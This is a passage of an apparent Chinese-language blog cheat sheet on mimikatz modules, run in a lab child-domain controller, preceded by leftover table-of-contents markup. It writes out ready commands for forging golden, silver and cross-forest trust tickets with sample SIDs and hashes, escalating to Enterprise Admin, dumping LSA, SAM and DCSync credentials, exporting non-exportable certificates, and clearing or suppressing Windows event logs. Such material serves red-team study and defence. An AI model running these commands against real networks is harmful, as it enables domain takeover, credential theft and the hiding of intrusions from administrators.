获得restore权限</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-PROCESS"><span class="toc-number">12.</span> <span class="toc-text">10.PROCESS</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#PROCESS-Exports-%E5%88%97%E5%87%BA%E8%BF%9B%E7%A8%8B"><span class="toc-number">12.0.1.</span> <span class="toc-text">PROCESS::Exports - 列出进程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PROCESS-IMPORTS-%E5%88%97%E5%87%BAIMPORTS"><span class="toc-number">12.0.2.</span> <span class="toc-text">PROCESS::IMPORTS - 列出IMPORTS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PROCESS-list-%E5%88%97%E5%87%BA%E6%AD%A3%E5%9C%A8%E8%BF%90%E8%A1%8C%E7%9A%84%E8%BF%9B%E7%A8%8B"><span class="toc-number">12.0.3.</span> <span class="toc-text">PROCESS::list - 列出正在运行的进程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PROCESS-RESUME-%E6%81%A2%E5%A4%8D%E4%B8%80%E4%B8%AA%E8%BF%9B%E7%A8%8B"><span class="toc-number">12.0.4.</span> <span class="toc-text">PROCESS::RESUME - 恢复一个进程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PROCESS-START-%E5%90%AF%E5%8A%A8%E4%B8%80%E4%B8%AA%E8%BF%9B%E7%A8%8B"><span class="toc-number">12.0.5.</span> <span class="toc-text">PROCESS::START - 启动一个进程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PROCESS-STOP-%E5%81%9C%E6%AD%A2"><span class="toc-number">12.0.6.</span> <span class="toc-text">PROCESS::STOP - 停止</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PROCESS-SUSPEND-%E6%8C%82%E8%B5%B7"><span class="toc-number">12.0.7.</span> <span class="toc-text">PROCESS::SUSPEND - 挂起</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-SEKURLSA"><span class="toc-number">13.</span> <span class="toc-text">11.SEKURLSA</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SEKURLSA-BACKUPKEYS-%E8%8E%B7%E5%8F%96%E9%A6%96%E9%80%89%E7%9A%84%E5%A4%87%E4%BB%BD%E4%B8%BB%E5%AF%86%E9%92%A5"><span class="toc-number">13.0.1.</span> <span class="toc-text">SEKURLSA::BACKUPKEYS - 获取首选的备份主密钥</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SEKURLSA-Credman-%E5%88%97%E5%87%BA%E5%87%AD%E8%AF%81%E7%AE%A1%E7%90%86%E5%99%A8"><span class="toc-number">13.0.2.</span> <span class="toc-text">SEKURLSA::Credman - 列出凭证管理器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SEKURLSA-Dpapi-%E5%88%97%E5%87%BA%E7%BC%93%E5%AD%98%E7%9A%84masterkeys"><span class="toc-number">13.0.3.</span> <span class="toc-text">SEKURLSA::Dpapi - 列出缓存的masterkeys</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SEKURLSA-DpapiSystem-DPAPI-SYSTEM-secret"><span class="toc-number">13.0.4.</span> <span class="toc-text">SEKURLSA::DpapiSystem - DPAPI_SYSTEM secret</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SEKURLSA-EKEYS-%E5%88%97%E5%87%BAKerberos%E5%8A%A0%E5%AF%86%E5%AF%86%E9%92%A5"><span class="toc-number">13.0.5.</span> <span class="toc-text">SEKURLSA::EKEYS - 列出Kerberos加密密钥</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SEKURLSA-KERBEROS-%E5%88%97%E5%87%BA%E5%B7%B2%E6%8E%88%E6%9D%83%E9%AA%8C%E8%AF%81%E7%94%A8%E6%88%B7%E7%9A%84Kerberos%E5%87%AD%E8%AF%81%E4%BF%A1%E6%81%AF%EF%BC%88%E5%8C%85%E6%8B%AC%E7%94%B5%E8%84%91%E8%B4%A6%E6%88%B7%E5%92%8C%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7%EF%BC%89"><span class="toc-number">13.0.6.</span> <span class="toc-text">SEKURLSA::KERBEROS - 列出已授权验证用户的Kerberos凭证信息（包括电脑账户和服务账户）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SEKURLSA-krbtgt-%E8%8E%B7%E5%8F%96%E5%9F%9FKerberos%E6%9C%8D%E5%8A%A1%E8%B4%A6%E5%8F%B7%E7%9A%84%E5%AF%86%E7%A0%81%E6%95%B0%E6%8D%AE"><span class="toc-number">13.0.7.</span> <span class="toc-text">SEKURLSA::krbtgt - 获取域Kerberos服务账号的密码数据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SEKURLSA-LiveSSP-%E5%88%97%E5%87%BALiveSSP%E5%87%AD%E8%AF%81%E4%BF%A1%E6%81%AF"><span class="toc-number">13.0.8.</span> <span class="toc-text">SEKURLSA::LiveSSP - 列出LiveSSP凭证信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SEKURLSA-logonpasswords-%E5%88%97%E5%87%BA%E6%9C%80%E8%BF%91%E7%99%BB%E9%99%86%E8%BF%87%E7%9A%84%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF"><span class="toc-number">13.0.9.</span> <span class="toc-text">SEKURLSA::logonpasswords - 列出最近登陆过的所有用户的密码信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SEKURLSA-Minidump-%E5%88%87%E6%8D%A2%E5%88%B0LSASS-minidump%E8%BF%9B%E7%A8%8B%E4%B8%8A%E4%B8%8B%E6%96%87"><span class="toc-number">13.0.10.</span> <span class="toc-text">SEKURLSA::Minidump - 切换到LSASS minidump进程上下文</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SEKURLSA-MSV-%E5%88%97%E5%87%BALM-amp-NTLM%E5%87%AD%E8%AF%81"><span class="toc-number">13.0.11.</span> <span class="toc-text">SEKURLSA::MSV - 列出LM &amp; NTLM凭证</span></a></li></ol></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        mimikatz常用命令
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Code Life</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2017-07-30T11:45:41.000Z" itemprop="datePublished">2017-07-30</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/mimikatz-adsec/" rel="tag">mimikatz, adsec</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h3 id="mimikatz的一些常用模块"><a href="#mimikatz的一些常用模块" class="headerlink" title="mimikatz的一些常用模块"></a>mimikatz的一些常用模块</h3><h3 id="测试环境：Windows-2012-R2-子域DC"><a href="#测试环境：Windows-2012-R2-子域DC" class="headerlink" title="测试环境：Windows 2012 R2 子域DC"></a>测试环境：Windows 2012 R2 子域DC</h3><h3 id="1-CRYPTO模块"><a href="#1-CRYPTO模块" class="headerlink" title="1.CRYPTO模块"></a>1.CRYPTO模块</h3><p>crypto模块提供与Windows加密功能(CryptoAPI)接合的功能，主要用来导出那些没有被标记为“可导出”的证书</p>
<h5 id="crypto-capi-给CryptoAPI打补丁，方便导出证书"><a href="#crypto-capi-给CryptoAPI打补丁，方便导出证书" class="headerlink" title="crypto::capi 给CryptoAPI打补丁，方便导出证书"></a>crypto::capi 给CryptoAPI打补丁，方便导出证书</h5><p><img src="../img/crypto.capi.png"></p>
<h5 id="crypto-certificates-列出-导出证书"><a href="#crypto-certificates-列出-导出证书" class="headerlink" title="crypto::certificates 列出/导出证书"></a>crypto::certificates 列出/导出证书</h5><p>通常需要先执行<code>privilege::debug</code>提升权限</p>
<ul>
<li>/systemstore    -    可选    -    系统默认使用的证书存储类型（default:CERT_SYSTEM_STORE_CURRENT_USER）</li>
<li>/store    -    可选    -    用于列出/导出证书（默认为:My)</li>
<li>/export    -    可选    -    用于导出证书到文件<br><img src="../img/crypto.cer.png"></li>
<li><code>crypto::stores</code>列出可用的<code>systemstore</code>和<code>store</code>参数的可用值</li>
<li>不可导出的key在导出的时候会出现错误信息（KO - ERROR kuhl_m_crypto_exportCert ; Export / CreateFile (0x8009000b)），可以使用<code>crypto::capi, crypto::cng</code>来进行补丁，通常可以导出，但是也需要相应的权限，比如UAC</li>
</ul>
<h5 id="crypto-cng-给CNG服务打补丁，方便导出证书（补丁Keylso服务）"><a href="#crypto-cng-给CNG服务打补丁，方便导出证书（补丁Keylso服务）" class="headerlink" title="crypto::cng    给CNG服务打补丁，方便导出证书（补丁Keylso服务）"></a>crypto::cng    给CNG服务打补丁，方便导出证书（补丁Keylso服务）</h5><h5 id="crypto-hash-对密码进行HASH操作"><a href="#crypto-hash-对密码进行HASH操作" class="headerlink" title="crypto::hash    对密码进行HASH操作"></a>crypto::hash    对密码进行HASH操作</h5><p><img src="../img/crypto.hash.png"></p>
<h5 id="crypto-keys-列出-导出密钥的容器"><a href="#crypto-keys-列出-导出密钥的容器" class="headerlink" title="crypto::keys    列出/导出密钥的容器"></a>crypto::keys    列出/导出密钥的容器</h5><p><img src="../img/crypto.keys.png"></p>
<h5 id="crypto-providers-列出加密提供商"><a href="#crypto-providers-列出加密提供商" class="headerlink" title="crypto::providers    列出加密提供商"></a>crypto::providers    列出加密提供商</h5><p><img src="../img/crypto.providers.png"></p>
<h5 id="crypto-stores-列出加密存储类型"><a href="#crypto-stores-列出加密存储类型" class="headerlink" title="crypto::stores        列出加密存储类型"></a>crypto::stores        列出加密存储类型</h5><p>/systemstore    -    可选    -    系统默认使用的证书存储类<br>store可用值:<br>CERT_SYSTEM_STORE_CURRENT_USER or CURRENT_USER<br>CERT_SYSTEM_STORE_CURRENT_USER_GROUP_POLICY or USER_GROUP_POLICY<br>CERT_SYSTEM_STORE_LOCAL_MACHINE or LOCAL_MACHINE<br>CERT_SYSTEM_STORE_LOCAL_MACHINE_GROUP_POLICY or LOCAL_MACHINE_GROUP_POLICY<br>CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE or LOCAL_MACHINE_ENTERPRISE<br>CERT_SYSTEM_STORE_CURRENT_SERVICE or CURRENT_SERVICE<br>CERT_SYSTEM_STORE_USERS or USERS<br>CERT_SYSTEM_STORE_SERVICES or SERVICES</p>
<h5 id="crypto-system-提供系统证书文件的路径或者注册表配置"><a href="#crypto-system-提供系统证书文件的路径或者注册表配置" class="headerlink" title="crypto:system     提供系统证书文件的路径或者注册表配置"></a>crypto:system     提供系统证书文件的路径或者注册表配置</h5><h3 id="2-DPAPI模块"><a href="#2-DPAPI模块" class="headerlink" title="2.DPAPI模块"></a>2.DPAPI模块</h3><ul>
<li>DPAPI::BLOB    通过API或者Masterkey解除对DPAPI blob的保护</li>
<li>DPAII::CACHE</li>
<li>DPAPI::CAPI    CAPI KEY测试</li>
<li>DPAPI::CNG    CNG KEY测试</li>
<li>DPAPI::CRED    CER TEST</li>
<li>DPAPI::CREDHIST    配置一个credhist文件</li>
<li>DPAPI::MASTERKEY    配置一个masterkey文件或解除保护（需要密钥key）</li>
<li>DPAPI::PROTECT    使用DPAPI保护数据</li>
<li>DPAPI::VAULT        VAULT测试</li>
<li>DPAPI::WIFI        WIFI测试（需要XML配置文件 - <a target="_blank" rel="noopener" href="https://onedrive.live.com/view.aspx?resid=A352EBC5934F0254!3104&app=Excel">reference Ben’s spreadsheet</a>）</li>
<li>DPAPI::WWAN        WWAN测试（需要XML配置文件 - <a target="_blank" rel="noopener" href="https://onedrive.live.com/view.aspx?resid=A352EBC5934F0254!3104&app=Excel">reference Ben’s spreadsheet</a>）</li>
</ul>
<h3 id="3-EVENT模块"><a href="#3-EVENT模块" class="headerlink" title="3.EVENT模块"></a>3.EVENT模块</h3><p>1.EVENT::CLEAR    清除事件日志<br>2.EVENT::DROP    给事件记录服务打补丁，从而避免产生新的事件<br><img src="../img/event.png"></p>
<h3 id="4-KERBEROS模块"><a href="#4-KERBEROS模块" class="headerlink" title="4.KERBEROS模块"></a>4.KERBEROS模块</h3><p>KERBEROS模块用于与微软的KerberosAPI进行交互，执行该模块不需要特殊的权限</p>
<h5 id="KERBEROS-ASK-请求TGS票据"><a href="#KERBEROS-ASK-请求TGS票据" class="headerlink" title="KERBEROS::ASK    请求TGS票据"></a>KERBEROS::ASK    请求TGS票据</h5><p><img src="../img/kerberos.ask.png"></p>
<h5 id="KERBEROS-CLIST-列出在MIT-HEIMDALL缓存中的票据"><a href="#KERBEROS-CLIST-列出在MIT-HEIMDALL缓存中的票据" class="headerlink" title="KERBEROS::CLIST    列出在MIT/HEIMDALL缓存中的票据"></a>KERBEROS::CLIST    列出在MIT/HEIMDALL缓存中的票据</h5><h5 id="KERBEROS-GOLDEN-创建黄金票据-白银票据-信任票据"><a href="#KERBEROS-GOLDEN-创建黄金票据-白银票据-信任票据" class="headerlink" title="KERBEROS::GOLDEN    创建黄金票据/白银票据/信任票据"></a>KERBEROS::GOLDEN    创建黄金票据/白银票据/信任票据</h5><p>该命令的功能是基于检索到的密码的hash类型类执行的</p>
<h5 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h5><p>使用黄金票据必须的一些条件：</p>
<ul>
<li>域的名称，可使用(Get-ADDomain).DNSRoot获得</li>
<li>域的SID，可使用(Get-ADDomain).DomainSID.Value获得</li>
<li>krbtgt账户的密码HASH,可以用mimikatz的<code>lssdump::lsa /inject /name:krbtgt</code>命令获得</li>
<li>一个用于模拟的用户ID（可以存在也可以不存在）</li>
</ul>
<p>黄金票据的参数：</p>
<ul>
<li>/domain    指定域的名字</li>
<li>/sid        指定域的SID</li>
<li>/sids        指定想要欺骗在AD林中的其他用户/组的SID，通常根域中的 Enterprise Admins group 的SID为“S-1-5-21-1473643419-774954089-5872329127-519”</li>
<li>/user        一个用于模拟的用户名</li>
<li>/groups    可选，用户组的RID（通常第一个是主要的组），添加用户/计算机用户的RID，获得相对应的权限。默认管理组的RID： 513,512,520,518,519 </li>
<li>/krbtgt    域KDC服务账户（krbtgt）的NTLM密码HASH，用于加密和签名TGT</li>
<li>/ticket    可选，用于提供一个路径/名称来保存黄金票据，方便用户之后能够快速使用/ptt参数来将黄金票据注入到内存中使用</li>
<li>/ptt        /ticket的代替参数，可以快速注入外部的黄金票据到内存中</li>
<li>/id        可选，用户的RID，默认是500，为administrator的RID</li>
<li>/startoffset    可选，票据可用时的起始偏移量（通常为-10和0），mimikatz默认为0</li>
<li>/endin    可选，票据的生命周期，mimikatz默认为10年，AD的Kerberos策略默认设置为10小时</li>
<li>/renewmax    可选，更新后的票据的最大生命周期，mimikatz默认10年，AD的Kerberos策略默认设置为7天，10080min</li>
<li>/aes128    AES128 KEY</li>
<li>/aes256    AES256 KEY</li>
</ul>
<p>黄金票据的默认组：</p>
<ul>
<li>Domain Users SID: S-1-5-21<DOMAINID>-513</li>
<li>Domain Admins SID: S-1-5-21<DOMAINID>-512</li>
<li>Schema Admins SID: S-1-5-21<DOMAINID>-518</li>
<li>Enterprise Admins SID: S-1-5-21<DOMAINID>-519  (只有在林的根域中创建了伪造的票据并且使用/sids参数指定AD林中的管理员权限的情况下才会有效)</li>
<li>Group Policy Creator Owners SID: S-1-5-21<DOMAINID>-520</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden &#x2F;admin:ADMIINACCOUNTNAME &#x2F;domain:DOMAINFQDN &#x2F;id:ACCOUNTRID &#x2F;sid:DOMAINSID &#x2F;krbtgt:KRBTGTPASSWORDHASH &#x2F;ptt</span><br></pre></td></tr></table></figure>
<p><img src="../img/kerberos.godlen.jpg"></p>
<h5 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h5><p>白银票据是一个TGS（和TGT的格式类似），使用了目标服务账户（由SPN映射标识）的NTLM密码HASH来进行加密和签名，mimikatz使用<code>kerberos::golden</code>来创建一个白银票据，白银票据创建的是TGS服务，只能访问有限的服务。<br>创建白银票据必要的参数，其他参数和黄金票据一样</p>
<ul>
<li>/target    目标服务器的FQDN</li>
<li>/service    目标服务器上运行的Kerberos服务，这里填运行该服务的主体的名称，比如cifs，http，mssql</li>
<li>/rc4        目标服务器的NTLM HASH（计算机账户或者用户账户，<strong>一般为计算机账户，比如计算机名为DC,那么就是要DC$的HASH</strong>）</li>
</ul>
<p>白银票据的默认组</p>
<ul>
<li>Domain Users SID: S-1-5-21<DOMAINID>-513</li>
<li>Domain Admins SID: S-1-5-21<DOMAINID>-512</li>
<li>Schema Admins SID: S-1-5-21<DOMAINID>-518</li>
<li>Enterprise Admins SID: S-1-5-21<DOMAINID>-519  (只有在林的根域中创建了伪造的票据并且使用/sids参数指定AD林中的管理员权限的情况下才会有效)</li>
<li>Group Policy Creator Owners SID: S-1-5-21<DOMAINID>-520</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz “kerberos::golden &#x2F;admin:LukeSkywalker &#x2F;id:1106 &#x2F;domain:lab.adsecurity.org &#x2F;sid:S-1-5-21-1473643419-774954089-2222329127 &#x2F;target:adsmswin2k8r2.lab.adsecurity.org &#x2F;rc4:d7e2b80507ea074ad59f152a1ba20458 &#x2F;service:cifs &#x2F;ptt” exit</span><br></pre></td></tr></table></figure>
<p><img src="../img/silver.jpg"></p>
<h4 id="信任票据"><a href="#信任票据" class="headerlink" title="信任票据"></a>信任票据</h4><p>一旦AD的信任密码HASH确定后，一个信任票据就会被创建（Mimikatz “privilege::debug” “lsadump::trust /patch” exit）</p>
<h5 id="伪造一个内部AD林的信任票据"><a href="#伪造一个内部AD林的信任票据" class="headerlink" title="伪造一个内部AD林的信任票据"></a>伪造一个内部AD林的信任票据</h5><p>步骤1：导出受信任的密码/密钥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;lsadump::trust &#x2F;patch&quot; exit</span><br></pre></td></tr></table></figure>
<p><img src="../img/trust1.jpg"></p>
<p>步骤2：使用Mimikatz创建一个伪造的受信任票据（跨域TGT）<br>伪造票据说明了该票据的持有者为AD林中的Enterprise Admin，拥有从子域到父域的完全访问权限。值得注意的是该伪造的用户不存在于任何计算机上，因为使用了黄金票据来得到域的信任，mimikatz使用<code>kerberos::golden</code>来创建一个信任票据。<br>创建信任票据必要的参数，其他参数和黄金票据一样</p>
<ul>
<li>/target    目标域名的FQDN</li>
<li>/service    目标服务器上运行的kerberos服务（krbtgt）</li>
<li>/rc4        目标服务器上运行Kerberos服务的服务账号的NTLM HASH（krbtgt）</li>
<li>/ticket    提供一个路径/名字来保存伪造的票据，方便之后使用/ptt参数快速将黄金票据注入到内存中使用</li>
</ul>
<p>信任票据的默认组</p>
<ul>
<li>Domain Users SID: S-1-5-21<DOMAINID>-513</li>
<li>Domain Admins SID: S-1-5-21<DOMAINID>-512</li>
<li>Schema Admins SID: S-1-5-21<DOMAINID>-518</li>
<li>Enterprise Admins SID: S-1-5-21<DOMAINID>-519  (只有在林的根域中创建了伪造的票据并且使用/sids参数指定AD林中的管理员权限的情况下才会有效)</li>
<li>Group Policy Creator Owners SID: S-1-5-21<DOMAINID>-520</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Mimikatz “kerberos::golden &#x2F;domain:child.adsec.lab &#x2F;sid:S-1-5-21-1420805320-1455282633-3118636415 &#x2F;sids:S-1-5-21-809894267-1102385918-1530562782-519 &#x2F;rc4:79003cc0433d25fe9606cf46f2aea8d1 &#x2F;user:deadfk3 &#x2F;service:krbtgt &#x2F;target:adsec.lab &#x2F;ticket:c:\temp\CHILD.ADSEC.LAB.kirbi” exit</span><br><span class="line">SIDS是父域的Enterprise Admin SID，SID是当前域的SID，NTLM HASH是父域的rc4,使用lsadump::trust &#x2F;patch可以得到</span><br><span class="line">注：使用SIDS参数会创建一个信任票据，从而告诉目标域，该信任票据的持有者是一个Enterprise Admin成员</span><br></pre></td></tr></table></figure>
<p><img src="../img/trust2.jpg"></p>
<p>步骤3：使用步骤2创建的信任票据去获得目标域上目标服务的TGS，并保存TGS到文件<br>结果是TGS给EA提供了访问父（根）域的域控制器上的CIFS服务的权限<br><img src="../img/kekeo1.jpg"></p>
<p>步骤4：把步骤3生成的TGS文件注入，以获得相应的权限去访问目标服务<br>注入前：<br><img src="../img/kekeo3.jpg"><br>注入后：<br><img src="../img/kekeo2.jpg"></p>
<h5 id="KERBEROS-Hash-把密码hash成密钥"><a href="#KERBEROS-Hash-把密码hash成密钥" class="headerlink" title="KERBEROS::Hash    -    把密码hash成密钥"></a>KERBEROS::Hash    -    把密码hash成密钥</h5><h5 id="KERBEROS-List-列出所有保存在用户内存中的用户的票据（TGT-TGS），不需要特殊的权限因为只列出当前用户的票据，就像命令klist"><a href="#KERBEROS-List-列出所有保存在用户内存中的用户的票据（TGT-TGS），不需要特殊的权限因为只列出当前用户的票据，就像命令klist" class="headerlink" title="KERBEROS::List    -    列出所有保存在用户内存中的用户的票据（TGT/TGS），不需要特殊的权限因为只列出当前用户的票据，就像命令klist"></a>KERBEROS::List    -    列出所有保存在用户内存中的用户的票据（TGT/TGS），不需要特殊的权限因为只列出当前用户的票据，就像命令klist</h5><ul>
<li>/export    -    导出用户的票据到文件</li>
</ul>
<p>使用<code>SEKURLSA::TICKETS</code>命令把当前系统上所有已验证用户的kerberos票据dump下来。有些情况下用户的证书不会导出，这时候需要运行<code>SEKURLSA::TICKETS /EXPORT</code>,需要相应的权限。<br><img src="../img/kerberos.list.jpg"></p>
<h5 id="KERBEROS-PTC-传递缓存（NT6）"><a href="#KERBEROS-PTC-传递缓存（NT6）" class="headerlink" title="KERBEROS::PTC        -    传递缓存（NT6）"></a>KERBEROS::PTC        -    传递缓存（NT6）</h5><p>*Nix类的系统，都会缓存kerberos凭证，这些缓存的数据可以使用mimikatz来进行拷贝和传递，同样对把Kerberos票据注入到缓存文件中也很有帮助。一个例子就是利用MS14068的漏洞，使用pykeke生成一个缓存文件，然后使用mimikatz的kerberos:ptc命令注入。</p>
<h5 id="KERBEROS-PTT-传递票据"><a href="#KERBEROS-PTT-传递票据" class="headerlink" title="KERBEROS::PTT        -    传递票据"></a>KERBEROS::PTT        -    传递票据</h5><p>当得到一个Kerberos票据之后，它可以拷贝到其他系统上，并且能够有效的注入到当前会话，来模拟一次登陆，而无需与域控有任何通信，不需要特殊权限。<br>命令：SEKURLSA::PTT(pass-the-ticket)</p>
<ul>
<li>/filename    -    票据文件名，可以多个</li>
<li>/diretory    -    票据目录，该目录下的所有kirbi文件都会被注入</li>
</ul>
<p>先生成一个kribi黄金票据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;kerberos::golden &#x2F;admin:deadfk &#x2F;domain:child.adsec.lab &#x2F;id:8888 &#x2F;sid:S-1-5-21-1420805320-1455282633-3118636415 &#x2F;krbtgt:a2ba962ef41bb5e9635c2ae3173ee8a3 &#x2F;ticket:deadfk.kribi&quot; exit</span><br></pre></td></tr></table></figure>
<p>再使用ptt来注入<br><img src="../img/kerberos.ptt.jpg"></p>
<h5 id="KERBEROS-PURGE-清除当前会话中的所有kerberos票据"><a href="#KERBEROS-PURGE-清除当前会话中的所有kerberos票据" class="headerlink" title="KERBEROS::PURGE    清除当前会话中的所有kerberos票据"></a>KERBEROS::PURGE    清除当前会话中的所有kerberos票据</h5><h5 id="KERBEROS-TGT-获得当前用户的TGT"><a href="#KERBEROS-TGT-获得当前用户的TGT" class="headerlink" title="KERBEROS::TGT        获得当前用户的TGT"></a>KERBEROS::TGT        获得当前用户的TGT</h5><p><img src="../img/kerberos.tgt.jpg"></p>
<h3 id="5-LSADUMP"><a href="#5-LSADUMP" class="headerlink" title="5.LSADUMP"></a>5.LSADUMP</h3><p>LSADUMP模块通过与Windows本地安全验证机构（LSA）进行交互获得凭证信息。该模块的大多数命令都需要<code>debug</code>权限或者本地管理员权限，一般管理员组都有<code>debug</code>权限，必须要用户手动输入<code>privilege::debug</code>才能进行提权.</p>
<h5 id="LSADUMP-BACKUPKEYS"><a href="#LSADUMP-BACKUPKEYS" class="headerlink" title="LSADUMP::BACKUPKEYS"></a>LSADUMP::BACKUPKEYS</h5><p>要求管理员权限<br><img src="../img/lsadump.backupkeys.jpg"></p>
<h5 id="LSADUMP-CACHE-获取Syskey用来解密NL-KM-AND-MSCACHE-V2-从注册表或者hives文件中获取"><a href="#LSADUMP-CACHE-获取Syskey用来解密NL-KM-AND-MSCACHE-V2-从注册表或者hives文件中获取" class="headerlink" title="LSADUMP::CACHE    -    获取Syskey用来解密NL$KM AND MSCACHE(V2)(从注册表或者hives文件中获取)"></a>LSADUMP::CACHE    -    获取Syskey用来解密NL$KM AND MSCACHE(V2)(从注册表或者hives文件中获取)</h5><p>需要管理员权限<br><img src="../img/lsadump.cache.jpg"></p>
<h5 id="LSADUMP-DCSYNC-向DC发起一个同步对象请求-获取账户密码数据"><a href="#LSADUMP-DCSYNC-向DC发起一个同步对象请求-获取账户密码数据" class="headerlink" title="LSADUMP::DCSYNC    -    向DC发起一个同步对象请求(获取账户密码数据)"></a>LSADUMP::DCSYNC    -    向DC发起一个同步对象请求(获取账户密码数据)</h5><p>要运行该命令,需要一些指定的权限:管理员组,域管理员组,企业管理员组成员以及域控制器的计算机账户都可以通过DCSync把密码读取出来.需要注意的是被设置只读属性的域控制器是无法把密码读取出来的。</p>
<h6 id="DCSync是如何工作的"><a href="#DCSync是如何工作的" class="headerlink" title="DCSync是如何工作的"></a>DCSync是如何工作的</h6><ul>
<li>发现用户所指定的域名的域控制器</li>
<li>通过GetNCChanges去请求域控制器获取用户的凭证（利用了远程协议服务Directory Replication Service (DRS)）</li>
</ul>
<p>DCSync参数选项</p>
<ul>
<li>/user    -    要获取的数据的用户ID或者SID</li>
<li>/domain    -    可选，活动目录的FQDN域名。mimikatz会自动发现该域名下的DC，如果不指定该参数，默认是当前域</li>
<li>/dc    -    指定域控</li>
<li>/guid</li>
</ul>
<p>命令例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">从child.adsec.lab域取回jane用户的密码</span><br><span class="line">Mimikatz “privilege::debug” “lsadump::dcsync &#x2F;domain:child.adsec.lab &#x2F;user:jane” exit</span><br></pre></td></tr></table></figure>
<p><img src="../img/lsadump.dcsync.jpg"></p>
<h5 id="LSADUMP-LSA-从LSA服务中导出活动目录中的凭证信息，也可以导出指定用户的凭证"><a href="#LSADUMP-LSA-从LSA服务中导出活动目录中的凭证信息，也可以导出指定用户的凭证" class="headerlink" title="LSADUMP::LSA    -    从LSA服务中导出活动目录中的凭证信息，也可以导出指定用户的凭证"></a>LSADUMP::LSA    -    从LSA服务中导出活动目录中的凭证信息，也可以导出指定用户的凭证</h5><p>要求system或者debug权限</p>
<ul>
<li>/inject - 注入LSASS进程获取凭证</li>
<li>/name - 指定目标用户</li>
<li>/id    - 目标账户的RID</li>
<li>/patch - 补丁LSASS进程</li>
</ul>
<p><code>mimikatz &quot;lsadump::lsa /inject&quot; exit</code><br>该命令如果在DC上运行，会导出整个活动目录的凭证信息，RID 502的是KRBTGT用户，RID 500的是默认域管理员账户<br><img src="../img/lsadump.lsa1.jpg"><br><code>lsadump::lsa /patch</code>只会导出活动目录里的NTLM HASH<br><img src="../img/lsadump.lsa2.jpg"></p>
<h5 id="LSADUMP-NETSYNC"><a href="#LSADUMP-NETSYNC" class="headerlink" title="LSADUMP::NETSYNC"></a>LSADUMP::NETSYNC</h5><p>netsync提供了一个简单的方法，通过白银票据让一个DC的计算机账户的密码去模拟一个域控制器，然后通过DCSYNC来获取目标账户的信息，包括密码数据。</p>
<h5 id="LSADUMP-RPDATA"><a href="#LSADUMP-RPDATA" class="headerlink" title="LSADUMP::RPDATA"></a>LSADUMP::RPDATA</h5><h5 id="LSADUMP-SAM-获取sysken来解密SAM（从注册表或者hive文件中获取）。SAM会连接到本地安全账户管理数据库（SAM）并且转存本地账户的凭证。"><a href="#LSADUMP-SAM-获取sysken来解密SAM（从注册表或者hive文件中获取）。SAM会连接到本地安全账户管理数据库（SAM）并且转存本地账户的凭证。" class="headerlink" title="LSADUMP::SAM - 获取sysken来解密SAM（从注册表或者hive文件中获取）。SAM会连接到本地安全账户管理数据库（SAM）并且转存本地账户的凭证。"></a>LSADUMP::SAM - 获取sysken来解密SAM（从注册表或者hive文件中获取）。SAM会连接到本地安全账户管理数据库（SAM）并且转存本地账户的凭证。</h5><p>需要system或者debug权限<br>SAM包含用户密码的NTLM,部分LM HASH，该文件可以在线（需要system用户的token）或者离线工作（需要system权限和SAM HIVES文件或者备份）。<br>需要administrator权限（debug）或者本地system权限来运行在线SAM服务<br><img src="../img/lsadump.sam1.jpg"></p>
